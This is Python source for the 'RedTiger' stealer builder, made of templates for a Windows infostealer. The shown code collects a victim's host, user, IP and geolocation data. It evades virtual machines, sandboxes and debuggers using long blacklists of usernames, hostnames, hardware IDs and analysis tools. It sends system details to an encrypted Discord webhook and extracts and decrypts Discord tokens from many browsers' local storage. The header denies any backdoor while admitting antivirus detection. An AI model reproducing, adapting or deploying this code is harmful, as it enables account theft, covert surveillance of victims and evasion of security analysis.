# Copyright (c) RedTiger (https://redtiger.shop)
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

#    ╔════════════════════════════════════════════════════════════════════════════╗
#    ║ ! File detected by the antivirus, but be aware that there is no backdoor ! ║
#    ╚════════════════════════════════════════════════════════════════════════════╝


Obligatory = r'''
import sys

def On1y_W1nd0w5():
    if sys.platform.startswith("win"):
        return False
    else:
        return True

try: v4r_d3t3ct = On1y_W1nd0w5()
except: v4r_d3t3ct = False

if v4r_d3t3ct == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import threading
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import base64

def B10ck_K3y(): pass
def Unb10ck_K3y(): pass
def B10ck_T45k_M4n4g3r(): pass
def B10ck_M0u53(): pass
def B10ck_W3b5it3(): pass
def St4rtup(): pass
def Sy5t3m_Inf0(): pass
def Op3n_U53r_Pr0fi13_53tting5(): pass
def Scr33n5h0t(): pass
def C4m3r4_C4ptur3(): pass
def Di5c0rd_T0k3n(): pass
def Di5c0rd_inj3c710n(): pass
def Br0w53r_5t341(): pass
def R0b10x_C00ki3(): pass
def F4k3_3rr0r(): pass
def Sp4m_0p3n_Pr0gr4m(): pass
def Sp4m_Cr34t_Fil3(): pass
def Shutd0wn(): pass
def Sp4m_Opti0ns(): pass
def R3st4rt(): pass

def Clear():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def Decrypt(v4r_encrypted, v4r_key):
    def DeriveKey(v4r_password, v4r_salt):
        v4r_kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=v4r_salt, iterations=100000, backend=default_backend())
        if isinstance(v4r_password, str):  
            v4r_password = v4r_password.encode()  
        return v4r_kdf.derive(v4r_password)

    v4r_encrypted_data = base64.b64decode(v4r_encrypted)
    v4r_salt = v4r_encrypted_data[:16]
    v4r_iv = v4r_encrypted_data[16:32]
    v4r_encrypted_data = v4r_encrypted_data[32:]
    v4r_derived_key = DeriveKey(v4r_key, v4r_salt)
    v4r_cipher = Cipher(algorithms.AES(v4r_derived_key), modes.CBC(v4r_iv), backend=default_backend())
    v4r_decryptor = v4r_cipher.decryptor()
    v4r_decrypted_data = v4r_decryptor.update(v4r_encrypted_data) + v4r_decryptor.finalize()
    v4r_unpadder = padding.PKCS7(128).unpadder()
    v4r_original_data = v4r_unpadder.update(v4r_decrypted_data) + v4r_unpadder.finalize()
    return v4r_original_data.decode()

v4r_w3bh00k_ur1_crypt = r"""
%WEBHOOK_URL%
"""
v4r_k3y = "%KEY%"
v4r_website = "%LINK_WEBSITE%"
v4r_color_embed = 0xa80505
v4r_username_embed = "RedTiger Ste4ler"
v4r_avatar_embed = "%LINK_AVATAR%"
v4r_footer_text = "RedTiger Ste4ler - %LINK_GITHUB%"
v4r_footer_embed = {
        "text": v4r_footer_text,
        "icon_url": v4r_avatar_embed,
        }
                 
v4r_w3bh00k_ur1 = Decrypt(v4r_w3bh00k_ur1_crypt, v4r_k3y)

try: v4r_hostname_pc = socket.gethostname()
except: v4r_hostname_pc = "None"

try: v4r_username_pc = os.getlogin()
except: v4r_username_pc = "None"

try: v4r_displayname_pc = win32api.GetUserNameEx(win32api.NameDisplay)
except: v4r_displayname_pc = "None"

try: v4r_ip_address_public = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: v4r_ip_address_public = "None"

try: v4r_ip_adress_local = socket.gethostbyname(socket.gethostname())
except: v4r_ip_adress_local = "None"

try:
    v4r_response = requests.get(f"https://{v4r_website}/api/ip/ip={v4r_ip_address_public}")
    v4r_api = v4r_response.json()

    v4r_country = v4r_api.get('country', "None")
    v4r_country_code = v4r_api.get('country_code', "None")
    v4r_region = v4r_api.get('region', "None")
    v4r_region_code = v4r_api.get('region_code', "None")
    v4r_zip_postal = v4r_api.get('zip', "None")
    v4r_city = v4r_api.get('city', "None")
    v4r_latitude = v4r_api.get('latitude', "None")
    v4r_longitude = v4r_api.get('longitude', "None")
    v4r_timezone = v4r_api.get('timezone', "None")
    v4r_isp = v4r_api.get('isp', "None")
    v4r_org = v4r_api.get('org', "None")
    v4r_as_number = v4r_api.get('as', "None")
except:
    v4r_response = requests.get(f"http://ip-api.com/json/{v4r_ip_address_public}")
    v4r_api = v4r_response.json()

    v4r_country = v4r_api.get('country', "None")
    v4r_country_code = v4r_api.get('countryCode', "None")
    v4r_region = v4r_api.get('regionName', "None")
    v4r_region_code = v4r_api.get('region', "None")
    v4r_zip_postal = v4r_api.get('zip', "None")
    v4r_city = v4r_api.get('city', "None")
    v4r_latitude = v4r_api.get('lat', "None")
    v4r_longitude = v4r_api.get('lon', "None")
    v4r_timezone = v4r_api.get('timezone', "None")
    v4r_isp = v4r_api.get('isp', "None")
    v4r_org = v4r_api.get('org', "None")
    v4r_as_number = v4r_api.get('as', "None")
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Ant1VM4ndD3bug = r'''
import sys
import os
import socket
import win32api
import requests
import threading
import time

def B10ck_K3y(): pass
def Unb10ck_K3y(): pass
def B10ck_T45k_M4n4g3r(): pass
def B10ck_M0u53(): pass
def B10ck_W3b5it3(): pass
def St4rtup(): pass
def Sy5t3m_Inf0(): pass
def Op3n_U53r_Pr0fi13_53tting5(): pass
def Scr33n5h0t(): pass
def C4m3r4_C4ptur3(): pass
def Di5c0rd_T0k3n(): pass
def Di5c0rd_inj3c710n(): pass
def Br0w53r_5t341(): pass
def R0b10x_C00ki3(): pass
def F4k3_3rr0r(): pass
def Sp4m_0p3n_Pr0gr4m(): pass
def Sp4m_Cr34t_Fil3(): pass
def Shutd0wn(): pass
def Sp4m_Opti0ns(): pass
def R3st4rt(): pass

def Clear():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

v4r_w3bh00k_ur1 = "%WEBHOOK_URL%"
v4r_website = "redtiger.shop"
v4r_color_embed = 0xa80505
v4r_username_embed = 'RedTiger Ste4ler'
v4r_avatar_embed = 'https://cdn.discordapp.com/attachments/1268900329605300234/1276010081665683497/RedTiger-Logo.png?ex=66cf38be&is=66cde73e&hm=696c53b4791044ca0495d87f92e6d603e8383315d2ebdd385aaccfc6dbf6aa77&'
v4r_footer_text = "RedTiger Ste4ler | https://github.com/loxyteck/RedTiger-Tools"
v4r_footer_embed = {
        "text": v4r_footer_text,
        "icon_url": v4r_avatar_embed,
        }
                 

try: v4r_hostname_pc = socket.gethostname()
except: v4r_hostname_pc = "None"

try: v4r_username_pc = os.getlogin()
except: v4r_username_pc = "None"

try: v4r_displayname_pc = win32api.GetUserNameEx(win32api.NameDisplay)
except: v4r_displayname_pc = "None"

try: v4r_ip_address_public = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: v4r_ip_address_public = "None"

try: v4r_ip_adress_local = socket.gethostbyname(socket.gethostname())
except: v4r_ip_adress_local = "None"

try:
    v4r_response = requests.get(f"https://{v4r_website}/api/ip/ip={v4r_ip_address_public}")
    v4r_api = v4r_response.json()

    v4r_country = v4r_api.get('country', "None")
    v4r_country_code = v4r_api.get('country_code', "None")
    v4r_region = v4r_api.get('region', "None")
    v4r_region_code = v4r_api.get('region_code', "None")
    v4r_zip_postal = v4r_api.get('zip', "None")
    v4r_city = v4r_api.get('city', "None")
    v4r_latitude = v4r_api.get('latitude', "None")
    v4r_longitude = v4r_api.get('longitude', "None")
    v4r_timezone = v4r_api.get('timezone', "None")
    v4r_isp = v4r_api.get('isp', "None")
    v4r_org = v4r_api.get('org', "None")
    v4r_as_number = v4r_api.get('as', "None")
except:
    v4r_response = requests.get(f"http://ip-api.com/json/{ip_address_public}")
    v4r_api = v4r_response.json()

    v4r_country = v4r_api.get('country', "None")
    v4r_country_code = v4r_api.get('countryCode', "None")
    v4r_region = v4r_api.get('regionName', "None")
    v4r_region_code = v4r_api.get('region', "None")
    v4r_zip_postal = v4r_api.get('zip', "None")
    v4r_city = v4r_api.get('city', "None")
    v4r_latitude = v4r_api.get('lat', "None")
    v4r_longitude = v4r_api.get('lon', "None")
    v4r_timezone = v4r_api.get('timezone', "None")
    v4r_isp = v4r_api.get('isp', "None")
    v4r_org = v4r_api.get('org', "None")
    v4r_as_number = v4r_api.get('as', "None")

































def Ant1_VM_4nd_D38ug():
    import os
    import socket
    import subprocess
    import ctypes
    import sys
    import psutil

    v4r_b14ck_1i5t_u53rn4m35 = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'Bruno' 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg', 'stephpie']
    v4r_b14ck_1i5t_h05tn4m35 = ['0CC47AC83802', 'BEE7370C-8C0C-4', 'DESKTOP-ET51AJO', '965543', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42', 'test']
    v4r_b14ck_1i5t_hw1d5 = ['671BC5F7-4B0F-FF43-B923-8B1645581DC8', '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D', 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
    v4r_b14ck_1i5t_pr0gr4m = ['cheatengine', 'cheat engine', 'x32dbg', 'x64dbg', 'ollydbg', 'windbg', 'ida', 'ida64', 'ghidra', 'radare2', 'radare', 'dbg', 'immunitydbg', 'dnspy', 'softice', 'edb', 'debugger', 'visual studio debugger', 'lldb', 'gdb', 'valgrind', 'hex-rays', 'disassembler', 'tracer', 'debugview', 'procdump', 'strace', 'ltrace', 'drmemory', 'decompiler', 'hopper', 'binary ninja', 'bochs', 'vdb', 'frida', 'api monitor', 'process hacker', 'sysinternals', 'procexp', 'process explorer', 'monitor tool', 'vmmap', 'xperf', 'perfview', 'py-spy', 'strace-log']

    try:
        if sys.gettrace() is not None:
            return True
    except: pass

    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
    except: pass

    try:
        for v4r_proc in psutil.process_iter(['name']):
            try:
                v4r_process_name = str(v4r_proc.info['name']).lower()
                if any(debugger in v4r_process_name for debugger in v4r_b14ck_1i5t_pr0gr4m):
                    return True
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
            continue
    except: pass

    try:
        if os.getlogin() in v4r_b14ck_1i5t_u53rn4m35:
            return True
        elif os.getlogin().lower() in [v4r_u53rn4m3.lower() for v4r_u53rn4m3 in v4r_b14ck_1i5t_u53rn4m35]:
            return True
    except: pass

    try:
        if socket.gethostname() in v4r_b14ck_1i5t_h05tn4m35:
            return True
        elif socket.gethostname().lower() in [v4r_h05tn4m3.lower() for v4r_h05tn4m3 in v4r_b14ck_1i5t_h05tn4m35]:
            return True
    except: pass

    try: 
        if subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip() in v4r_b14ck_1i5t_hw1d5:
            return True
    except: pass

    return False

try: v4r_d3t3ct = Ant1_VM_4nd_D38ug()
except: v4r_d3t3ct = False

if v4r_d3t3ct == True:
    import sys
    sys.exit()
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Sy5t3mInf0 = r'''
def Sy5t3m_Inf0():
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    from discord import SyncWebhook, Embed

    try: v4r_sy5t3m_1nf0 = {platform.system()}
    except: v4r_sy5t3m_1nf0 = "None"

    try: v4r_sy5t3m_v3r5i0n_1nf0 = platform.version()
    except: v4r_sy5t3m_v3r5i0n_1nf0 = "None"

    try: v4r_m4c_4ddr355 = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: v4r_m4c_4ddr355 = "None"

    try: v4r_hw1d = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except: v4r_hw1d = "None"

    try: v4r_r4m_1nf0 = round(psutil.virtual_memory().total / (1024**3), 2)
    except: v4r_r4m_1nf0 = "None"

    try: v4r_cpu_1nf0 = platform.processor()
    except: v4r_cpu_1nf0 = "None"

    try: v4r_cpu_c0r3_1nf0 = psutil.cpu_count(logical=False)
    except: v4r_cpu_c0r3_1nf0 = "None"

    try: v4r_gpu_1nf0 = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: v4r_gpu_1nf0 = "None"

    try:
        v4r_drives_info = []
        v4r_bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for v4r_letter in string.ascii_uppercase:
            if v4r_bitmask & 1:
                v4r_drive_path = v4r_letter + ":\\"
                try:
                    v4r_free_bytes = ctypes.c_ulonglong(0)
                    v4r_total_bytes = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(v4r_drive_path), None, ctypes.pointer(v4r_total_bytes), ctypes.pointer(v4r_free_bytes))
                    v4r_total_space = v4r_total_bytes.value
                    v4r_free_space = v4r_free_bytes.value
                    v4r_used_space = v4r_total_space - v4r_free_space
                    v4r_drive_name = win32api.GetVolumeInformation(v4r_drive_path)[0]
                    drive = {
                        'drive': v4r_drive_path,
                        'total': v4r_total_space,
                        'free': v4r_free_space,
                        'used': v4r_used_space,
                        'name': v4r_drive_name,
                    }
                    v4r_drives_info.append(drive)
                except:
                    ()
            v4r_bitmask >>= 1

        v4r_d15k_5t4t5 = "{:<7} {:<10} {:<10} {:<10} {:<20}\n".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for v4r_drive in v4r_drives_info:
            v4r_use_percent = (v4r_drive['used'] / v4r_drive['total']) * 100
            v4r_free_space_gb = "{:.2f}GO".format(v4r_drive['free'] / (1024 ** 3))
            v4r_total_space_gb = "{:.2f}GO".format(v4r_drive['total'] / (1024 ** 3))
            v4r_use_percent_str = "{:.2f}%".format(v4r_use_percent)
            v4r_d15k_5t4t5 += "{:<7} {:<10} {:<10} {:<10} {:<20}".format(v4r_drive['drive'], 
                                                                   v4r_free_space_gb,
                                                                   v4r_total_space_gb,
                                                                   v4r_use_percent_str,
                                                                   v4r_drive['name'])
    except:
        v4r_d15k_5t4t5 = """Drive:  Free:      Total:     Use:       Name:       
None    None       None       None       None     
"""

    try:
        def is_portable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if is_portable():
            v4r_p14tf0rm_1nf0 = 'Pc Portable'
        else:
            v4r_p14tf0rm_1nf0 = 'Pc Fixed'
    except:
        v4r_p14tf0rm_1nf0 = "None"

    try: v4r_scr33n_number = len(screeninfo.get_monitors())
    except: v4r_scr33n_number = "None"

    embed = Embed(title=f'System Info `{v4r_username_pc} "{v4r_ip_address_public}"`:', color=v4r_color_embed)

    embed.add_field(name=":bust_in_silhouette: User Pc:", value=f"""```Hostname    : {v4r_hostname_pc}
Username    : {v4r_username_pc}
DisplayName : {v4r_displayname_pc}```""", inline=False)

    embed.add_field(name=":computer: System:", value=f"""```Plateform     : {v4r_p14tf0rm_1nf0}
Exploitation  : {v4r_sy5t3m_1nf0} {v4r_sy5t3m_v3r5i0n_1nf0}
Screen Number : {v4r_scr33n_number}

HWID : {v4r_hw1d}
MAC  : {v4r_m4c_4ddr355}
CPU  : {v4r_cpu_1nf0}, {v4r_cpu_c0r3_1nf0} Core
GPU  : {v4r_gpu_1nf0}
RAM  : {v4r_r4m_1nf0}Go```""", inline=False)

    embed.add_field(name=":satellite: Ip:", value=f"""```Public : {v4r_ip_address_public}
Local  : {v4r_ip_adress_local}
Isp    : {v4r_isp}
Org    : {v4r_org}
As     : {v4r_as_number}```""", inline=False)

    embed.add_field(name=":minidisc: Disk:", value=f"""```{v4r_d15k_5t4t5}```""", inline=False)

    embed.add_field(name=":map: Location:", value=f"""```Country   : {v4r_country} ({v4r_country_code})
Region    : {v4r_region} ({v4r_region_code})
Zip       : {v4r_zip_postal}
City      : {v4r_city}
Timezone  : {v4r_timezone}
Latitude  : {v4r_latitude}
Longitude : {v4r_longitude}```""", inline=False)

    embed.set_footer(text=v4r_footer_text, icon_url=v4r_avatar_embed)

    w3bh00k = SyncWebhook.from_url(v4r_w3bh00k_ur1)
    w3bh00k.send(embed=embed, username=v4r_username_embed, avatar_url=v4r_avatar_embed)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Di5c0rdT0k3n = r'''
def Di5c0rd_T0k3n():
    import os
    import re
    import json
    import base64
    import requests
    from Cryptodome.Cipher import AES
    from Cryptodome.Protocol.KDF import scrypt
    from win32crypt import CryptUnprotectData
    from discord import SyncWebhook, Embed

    def extr4ct_t0k3n5():
        v4r_base_url = "https://discord.com/api/v9/users/@me"
        v4r_appdata_local = os.getenv("localappdata")
        v4r_appdata_roaming = os.getenv("appdata")
        v4r_regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        v4r_regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        v4r_t0k3n5 = []
        v4r_uids = []
        v4r_token_info = {}

        v4r_paths = {
            'Discord': v4r_appdata_roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': v4r_appdata_roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': v4r_appdata_roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': v4r_appdata_roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': v4r_appdata_roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': v4r_appdata_roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': v4r_appdata_local + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': v4r_appdata_local + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': v4r_appdata_local + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': v4r_appdata_local + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': v4r_appdata_local + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': v4r_appdata_local + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': v4r_appdata_local + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': v4r_appdata_local + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome SxS': v4r_appdata_local + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Google Chrome': v4r_appdata_local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome1': v4r_appdata_local + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Google Chrome2': v4r_appdata_local + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Google Chrome3': v4r_appdata_local + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Google Chrome4': v4r_appdata_local + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Google Chrome5': v4r_appdata_local + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': v4r_appdata_local + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': v4r_appdata_local + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': v4r_appdata_local + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': v4r_appdata_local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': v4r_appdata_local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': v4r_appdata_local + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for v4r_name, v4r_path in v4r_paths.items():
            if not os.path.exists(v4r_path):
                continue
            v4r__d15c0rd = v4r_name.replace(" ", "").lower()
            if "cord" in v4r_path:
                if not os.path.exists(v4r_appdata_roaming + f'\\{v4r__d15c0rd}\\Local State'):
                    continue
                for v4r_file_name in os.listdir(v4r_path):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{v4r_path}\\{v4r_file_name}', errors='ignore') as v4r_file:
                        for v4r_line in v4r_file:
                            for y in re.findall(v4r_regexp_enc, v4r_line.strip()):
                                v4r_t0k3n = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(v4r_appdata_roaming + f'\\{v4r__d15c0rd}\\Local State'))
                                if validate_t0k3n(v4r_t0k3n, v4r_base_url):
                                    v4r_uid = requests.get(v4r_base_url, headers={'Authorization': v4r_t0k3n}).json()['id']
                                    if v4r_uid not in v4r_uids:
                                        v4r_t0k3n5.append(v4r_t0k3n)
